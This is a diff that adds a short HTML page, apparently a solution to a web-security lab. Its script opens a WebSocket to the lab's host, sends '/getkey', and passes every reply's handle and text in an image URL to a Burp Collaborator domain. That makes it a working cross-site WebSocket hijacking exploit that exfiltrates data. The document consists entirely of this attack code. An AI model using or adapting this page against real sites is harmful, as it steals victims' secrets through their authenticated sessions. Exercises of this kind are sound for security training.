@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <ul id="secrets"></ul>
+
+<script>
+
+    var ws = new WebSocket("ws://ptl-206cda5c-ac57a323.libcurl.so/")
+    ws.onmessage = function(message) {
+        var data = JSON.parse(message.data);
+        var ul= document.getElementById("secrets");
+        var li = document.createElement("img");
+        li.src = "https://198rbrko3ob5ialyb78h4nfpggm6av.burpcollaborator.net?handle="+data.handle+"&text="+data.text
+        ul.appendChild(li);
+    };
+    var text   = "/getkey"
+    ws.send(JSON.stringify({  text: text }));
+
+
+</script>
+
+
+  </body>
+</html>
